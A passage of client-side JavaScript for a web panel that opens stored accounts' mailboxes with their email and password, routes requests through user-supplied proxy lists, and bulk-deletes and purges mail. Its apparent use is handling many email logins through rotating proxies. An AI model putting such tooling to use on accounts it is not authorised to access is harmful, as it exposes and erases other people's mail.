      return '<div class="mail-item'+(window._mailFromFilter===k?' on':'')+'" data-from="'+esc(k)+'">'+avatarHTML(k)+'<div class="mail-item-body"><b>'+esc(k)+'</b><div class="mail-from"><span class="mail-chip tag-green" style="background:#22c55e;color:#052e16;border:1px solid #86efac">'+cnt+'</span></div></div></div>';
    }).join("");
    side.querySelectorAll(".mail-item").forEach(function(el){
      el.onclick=function(){ selectSender(el.getAttribute("data-from")||""); };
    });
  }
  if(!rows.length){
    var emptyMore="";
    var f=window._mailFromFilter||"";
    if(f){ var p=(window._senderPacks||{})[f]||{}; if(p.more) emptyMore='<div style="padding:8px 0 4px"><button class="secondary" type="button" id="mailMore">Load more</button></div>'; }
    else if(window._mailMore) emptyMore='<div style="padding:8px 0 4px"><button class="secondary" type="button" id="mailMore">Load more</button></div>';
    box.innerHTML='<div class="muted" style="padding:14px">No messages</div>'+emptyMore;
    var moreBtn=$("mailMore"); if(moreBtn) moreBtn.onclick=function(){ loadMailPage(true); };
    return;
  }
  var html=rows.map(function(x){
    return '<div class="mail-item'+(x.i===window._mailSel?' on':'')+'" data-i="'+x.i+'"><input class="mail-pick" type="checkbox" data-id="'+esc(x.m.id||'')+'" '+(window._mailPicked&&window._mailPicked[x.m.id]?'checked':'')+'/>'+avatarHTML(x.m.from)+'<div class="mail-item-body"><div style="display:flex;justify-content:space-between;gap:8px;align-items:flex-start"><b>'+esc(x.m.subject||"(no subject)")+'</b><button type="button" class="mail-del-mini" data-del="'+x.i+'" title="Delete">✕</button></div><div class="mail-from">'+(x.m.from?('<span class="mail-chip tag-yellow" style="background:#facc15;color:#422006;border:1px solid #fde047">'+esc(displayFromEmail(x.m.from))+'</span>'):'')+(x.m.date?('<span class="mail-chip tag-blue" style="background:#3b82f6;color:#eff6ff;border:1px solid #93c5fd">'+esc(formatMailDate(x.m.date))+'</span>'):'')+'</div><div class="muted" style="margin-top:6px">'+esc((x.m.preview||"").slice(0,110))+'</div></div></div>';
  }).join("")+(function(){
    var f=window._mailFromFilter||"";
    if(f){
      var p=(window._senderPacks||{})[f]||{};
      var n=(p.mails||[]).length, t=p.total||0;
      if(!p.more) return "";
      return '<div style="padding:8px 0 4px"><button class="secondary" type="button" id="mailMore">Load more'+(t?(' · '+n+' / '+t):'')+'</button></div>';
    }
    if(!window._mailMore) return "";
    return '<div style="padding:8px 0 4px"><button class="secondary" type="button" id="mailMore">Load more'+(window._mailTotal?(' · '+(window._mails||[]).length+' / '+window._mailTotal):'')+'</button></div>';
  })();
  box.innerHTML=html;
  box.querySelectorAll(".mail-item").forEach(function(el){
    el.onclick=function(){ showMail(parseInt(el.getAttribute("data-i"),10)); };
  });
  box.querySelectorAll(".mail-del-mini").forEach(function(el){
    el.onclick=function(ev){ ev.stopPropagation(); deleteMailAt(parseInt(el.getAttribute("data-del"),10)); };
  });
  box.querySelectorAll(".mail-pick").forEach(function(el){
    el.onclick=function(ev){ ev.stopPropagation(); };
    el.onchange=function(){
      window._mailPicked=window._mailPicked||{};
      if(el.checked) window._mailPicked[el.getAttribute("data-id")]=true; else delete window._mailPicked[el.getAttribute("data-id")];
      paintMailSel();
    };
  });
  paintMailSel();
  var more=$("mailMore");
  if(more) more.onclick=function(){ loadMailPage(true); };
}
function paintMailSel(){
  var n=Object.keys(window._mailPicked||{}).length;
  if($("mailSelCount")) $("mailSelCount").textContent=n? (n+" selected") : "";
  if($("mailPurge")) $("mailPurge").style.display=window._mailFolder==="deleted"?"":"none";
}
function selectSender(from){
  window._mailFromFilter=from||"";
  window._mailSel=-1;
  if($("mailRead")) $("mailRead").innerHTML='<div class="muted">Select a message</div>';
  if(!from){
    renderMails();
    if(activeMailList().length) showMail(0);
    return;
  }
  window._senderPacks=window._senderPacks||{};
  if(!window._senderPacks[from]){
    var seed=(window._mails||[]).filter(function(m){ return senderKey(m)===from; });
    window._senderPacks[from]={mails:seed.slice(), total:0, more:true, ready:false};
  }
  renderMails();
  if(!window._senderPacks[from].ready) loadSenderPage(from, false);
}
async function loadSenderPage(from, more){
  if(!window._mailAcc || !from) return;
  window._senderPacks=window._senderPacks||{};
  var pack=window._senderPacks[from]||{mails:[], total:0, more:true, ready:false};
  window._senderPacks[from]=pack;
  var off=more?(pack.mails.length+(pack._skip||0)):0;
  if(!more && $("mailList")) $("mailList").innerHTML='<div class="muted" style="padding:14px">Loading mail from '+esc(from)+'…</div>';
  try{
    var res=await fetch("/api/mail/list",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(Object.assign({email:window._mailAcc.email,password:window._mailAcc.password,from:off,size:100,query:"from:"+from+" kind:email",folder:window._mailFolder||"inbox"}, window._mailProxy||{}))});
    var d=await res.json();
    if(!d.ok){
      pack.ready=true;
      pack.more=false;
      renderMails();
      return;
    }
    var seen={};
    pack.mails.forEach(function(m){ seen[mailKey(m)]=true; });
    var added=0;
    (d.messages||[]).forEach(function(m){
      var k=mailKey(m);
      if(seen[k]) return;
      seen[k]=true;
      pack.mails.push(m);
      added++;
      var gseen=false;
      (window._mails||[]).forEach(function(x){ if(mailKey(x)===k) gseen=true; });
      if(!gseen) window._mails.push(m);
    });
    if(d.total) pack.total=d.total;
    pack.ready=true;
    if(more && added===0) pack._skip=(pack._skip||0)+100;
    pack.more= (pack.total && pack.mails.length<pack.total) || (!pack.total && (d.more || added>=10));
    if(window._mailFromFilter!==from) return;
    renderMails(more);
    if(!more && pack.mails.length) showMail(0);
  }catch(e){
    pack.ready=true;
    pack.more=false;
    if($("mailList")) $("mailList").innerHTML='<div class="muted" style="padding:14px">'+String(e)+'</div>';
  }
}
async function loadMailPage(more){
  if(!window._mailAcc) return;
  if(window._mailFromFilter){ return loadSenderPage(window._mailFromFilter, more); }
  if(!window._mailQuery) window._mailQuery="kind:email";
  if(!more){ window._mailFrom=0; window._mails=[]; window._mailSel=-1; $("mailList").innerHTML='<div class="muted" style="padding:14px">'+(window._mailAuthed?'Searching mailbox…':'Signing in…')+'</div>'; $("mailRead").innerHTML='<div class="muted">Select a message</div>'; }
  else { window._mailFrom = (window._mails||[]).length; }
  try{
    var res=await fetch("/api/mail/list",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(Object.assign({email:window._mailAcc.email,password:window._mailAcc.password,from:window._mailFrom,size:100,query:window._mailQuery,folder:window._mailFolder||"inbox"}, window._mailProxy||{}))});
    var txt=await res.text();
    var d;
    try{ d=JSON.parse(txt); }catch(e){ $("mailList").innerHTML='<div class="muted" style="padding:14px">Mail API did not return JSON</div>'; return; }
    if(!d.ok){ $("mailList").innerHTML='<div class="muted" style="padding:14px">'+(d.error||"Could not load mail")+'</div>'; return; }
    window._mailAuthed=true;
    if(d.total) window._mailTotal=d.total;
    var seen={};
    (window._mails||[]).forEach(function(m){ seen[mailKey(m)]=true; });
    var added=0;
    (d.messages||[]).forEach(function(m){
      var k=mailKey(m);
      if(seen[k]) return;
      seen[k]=true;
      window._mails.push(m);
      added++;
    });
    if(more && added===0){ window._mailFrom = (window._mails||[]).length + 100; }
    var loaded=(window._mails||[]).length;
    window._mailMore= added>0 && (!!d.more || (window._mailTotal && loaded<window._mailTotal) || added>=10);
    renderMails(more);
    if(!more && window._mails.length) showMail(0);
  }catch(e){ $("mailList").innerHTML='<div class="muted" style="padding:14px">'+String(e)+'</div>'; }
}
async function openMailViewer(a){
  resetMailState();
  closeMailMenus();
  window._mailAcc=a;
  $("mailTitle").textContent=a.email||"";
  $("mailAsk").classList.remove("on");
  $("mailPx").classList.remove("on");
  $("mailModal").classList.remove("on");
  try{
    var res=await fetch("/api/mail/probe",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:a.email})});
    var d=await res.json();
    if(d && d.ok){
      window._mailAuthed=true;
      window._mailTotal=d.total||0;
      window._mailMore=!!d.more || (window._mailTotal && (d.messages||[]).length<window._mailTotal);
      window._mails=d.messages||[];
      $("mailModal").classList.add("on");
      renderMails(false);
      if(window._mails.length) showMail(0);
      return;
    }
  }catch(e){}
  $("mailAsk").classList.add("on");
}
function mailStart(usePx){
  $("mailAsk").classList.remove("on");
  if(usePx){ closeMailMenus(); $("mailPx").classList.add("on"); loadMailPxMenus(); return; }
  window._mailProxy=null;
  $("mailModal").classList.add("on");
  loadMailPage(false);
}
window._mailPxMode="file";
function mailPxMode(m){
  window._mailPxMode=m;
  $("mailPxFileBox").style.display=m==="file"?"":"none";
  $("mailPxSrvBox").style.display=m==="server"?"":"none";
}
function mailPxAdd(val){
  var box=$("mailPxUrls");
  var inp=document.createElement("input");
  inp.placeholder="https://list/proxies.txt";
  if(val) inp.value=val;
  inp.style.marginTop="6px";
  box.appendChild(inp);
}
function mailPxSyncMinus(){
  var n=document.querySelectorAll("#mailPxUrls input").length;
  if($("mailPxDel")) $("mailPxDel").style.display=n>1?"":"none";
}
function mailPxFillMenu(menuId, kind, list){
  var menu=$(menuId); if(!menu) return;
  var rows=(list||[]).filter(function(x){ return kind==="server" ? x.type==="server" : x.type!=="server"; });
  if(!rows.length){ menu.innerHTML='<div class="muted">Nothing saved</div>'; return; }
  menu.innerHTML=rows.map(function(x){
    var meta=kind==="server"?((x.urls&&x.urls.length||0)+" urls · "+(x.count||0)+" proxies"):((x.count||0)+" proxies · "+(x.path||""));
    return '<div data-name="'+esc(x.name||'')+'"><b>'+esc(x.name||"list")+'</b><span class="tag">'+esc(meta)+'</span></div>';
  }).join("");
  menu.querySelectorAll("div[data-name]").forEach(function(div){
    div.onclick=function(){
      var x=rows.filter(function(z){ return z.name===div.getAttribute("data-name"); })[0];
      if(!x) return;
      menu.classList.remove("on");
      if(kind==="server"){
        mailPxMode("server");
        $("mailPxUrls").innerHTML="";
        (x.urls||[]).forEach(function(u){ mailPxAdd(u); });
        if($("mailPxCount")) $("mailPxCount").textContent=(x.count||0)+" proxies";
        mailPxSyncMinus();
      } else {
        mailPxMode("file");
        $("mailPxPath").value=x.path||"";
        if($("mailPxFileCount")) $("mailPxFileCount").textContent="0 proxies";
      }
    };
  });
}
async function loadMailPxMenus(){
  var list=await (await fetch("/api/proxy-lists")).json();
  window._mailPxLists=list||[];
  mailPxFillMenu("mailPxSavedMenu","file",list);
  mailPxFillMenu("mailPxSavedSrvMenu","server",list);
  if(!$("mailPxUrls").children.length) mailPxAdd("");
  mailPxSyncMinus();
}

if($("mailClose")) $("mailClose").onclick=function(){ $("mailModal").classList.remove("on"); resetMailState(); closeMailMenus(); closeMailDelAsk(); };
if($("mailDelNo")) $("mailDelNo").onclick=closeMailDelAsk;
if($("mailDelCancel")) $("mailDelCancel").onclick=closeMailDelAsk;
if($("mailDelYes")) $("mailDelYes").onclick=confirmDeleteMail;
if($("mailBulkDel")) $("mailBulkDel").onclick=deletePicked;
if($("mailSelAll")) $("mailSelAll").onchange=function(){
  window._mailPicked=window._mailPicked||{};
  activeMailList().forEach(function(m){ if(!m||!m.id) return; if($("mailSelAll").checked) window._mailPicked[m.id]=true; else delete window._mailPicked[m.id]; });
  renderMails();
};
if($("mailPurge")) $("mailPurge").onclick=function(){ emptyDeletedFolder(); };
async function emptyDeletedFolder(){
  window._mailFolder="deleted";
  window._mailDelPurge=true;
  if($("mailPurge")){ $("mailPurge").disabled=true; $("mailPurge").textContent="Emptying…"; }
  try{
    for(var n=0;n<30;n++){
      var ids=activeMailList().map(function(m){return m&&m.id;}).filter(Boolean);
      if(!ids.length){
        if(!window._mailMore) break;
        await loadMailPage(true);
        continue;
      }
      var res=await fetch("/api/mail/delete",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:(window._mailAcc&&window._mailAcc.email)||"",ids:ids,purge:true})});
      var d=await res.json();
      if(!d.ok) break;
      ids.forEach(function(id){
        activeMailList().slice().forEach(function(m){ if(m&&m.id===id) removeMailEverywhere(m); });
      });
      window._mailPicked={};
      if($("mailSelAll")) $("mailSelAll").checked=false;
      renderMails();
      if(window._mailMore) await loadMailPage(true);
    }
  }catch(e){}
  if($("mailPurge")){ $("mailPurge").disabled=false; $("mailPurge").textContent="Empty deleted"; }
  if($("mailRead")) $("mailRead").innerHTML='<div class="muted">Deleted folder emptied</div>';
}
document.querySelectorAll(".mail-folder").forEach(function(btn){
  btn.onclick=function(){
    document.querySelectorAll(".mail-folder").forEach(function(b){ b.classList.toggle("on", b===btn); });
    window._mailFolder=btn.getAttribute("data-folder")||"inbox";
    window._mailFromFilter="";
    window._mailQuery="kind:email";
    window._senderPacks={};
    window._mailPicked={};
    window._mails=[];
    window._mailFrom=0;
    window._mailTotal=0;
    window._mailMore=false;
    if($("mailQ")) $("mailQ").value="";
    loadMailPage(false);
  };
});
if($("mailSearchBtn")) $("mailSearchBtn").onclick=function(){
  var q=(($("mailQ")&&$("mailQ").value)||"").trim();
  window._mailQuery=q||"kind:email";
  loadMailPage(false);
};
if($("mailQ")) $("mailQ").onkeydown=function(e){ if(e.key==="Enter"){ e.preventDefault(); var q=(($("mailQ")&&$("mailQ").value)||"").trim(); window._mailQuery=q||"kind:email"; loadMailPage(false); } };
if($("mailNoPx")) $("mailNoPx").onclick=function(){ mailStart(false); };
if($("mailYesPx")) $("mailYesPx").onclick=function(){ mailStart(true); };
if($("mailPxFile")) $("mailPxFile").onclick=function(){ mailPxMode("file"); };
if($("mailPxSavedBtn")) $("mailPxSavedBtn").onclick=function(){ var m=$("mailPxSavedMenu"); if(m) m.classList.toggle("on"); };
if($("mailPxSavedSrvBtn")) $("mailPxSavedSrvBtn").onclick=function(){ var m=$("mailPxSavedSrvMenu"); if(m) m.classList.toggle("on"); };

if($("mailPxSrv")) $("mailPxSrv").onclick=function(){ mailPxMode("server"); };
if($("mailPxAdd")) $("mailPxAdd").onclick=function(){ mailPxAdd(""); mailPxSyncMinus(); };
if($("mailPxDel")) $("mailPxDel").onclick=function(){ var box=$("mailPxUrls"); if(box&&box.lastElementChild) box.removeChild(box.lastElementChild); mailPxSyncMinus(); };
if($("mailPxBrowse")) $("mailPxBrowse").onclick=async function(){
  var r=await (await fetch("/api/pick?kind=proxy")).json();
  if(r.path) $("mailPxPath").value=r.path;
};
if($("mailPxCheck")) $("mailPxCheck").onclick=async function(){
  var urls=[].slice.call(document.querySelectorAll("#mailPxUrls input")).map(function(i){return i.value.trim();}).filter(Boolean);
  $("mailPxCount").textContent="checking…";
  var r=await fetch("/api/proxy-fetch",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({urls:urls})});
  $("mailPxCount").textContent=r.ok?((await r.json()).count+" proxies"):"failed";
};
if($("mailPxCheckFile")) $("mailPxCheckFile").onclick=async function(){
  var path=($("mailPxPath")&&$("mailPxPath").value)||"";
  if($("mailPxFileCount")) $("mailPxFileCount").textContent="checking…";
  var r=await fetch("/api/proxy-fetch",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({path:path})});
  if($("mailPxFileCount")) $("mailPxFileCount").textContent=r.ok?((await r.json()).count+" proxies"):"failed";
};
if($("mailPxGo")) $("mailPxGo").onclick=function(){
  window._mailProxy={
    proxy_mode: window._mailPxMode||"file",
    proxy: ($("mailPxPath")&&$("mailPxPath").value)||"",
    proxy_urls: [].slice.call(document.querySelectorAll("#mailPxUrls input")).map(function(i){return i.value.trim();}).filter(Boolean)
  };
  $("mailPx").classList.remove("on");
  $("mailModal").classList.add("on");
  loadMailPage(false);
};
// search is client-side over already loaded mail (see earlier mailSearchBtn handler)

loadStats().then(loadAccounts);

(function live() {
  var t=null;
  try {
    const es = new EventSource("/api/events");
    es.onmessage = function() {
      if($("mailModal") && $("mailModal").classList.contains("on")) return;
      clearTimeout(t);
      t=setTimeout(function(){ loadStats().then(loadAccounts); }, 2500);
    };
  } catch (e) {}
})();
</script>
</body>
</html>
`
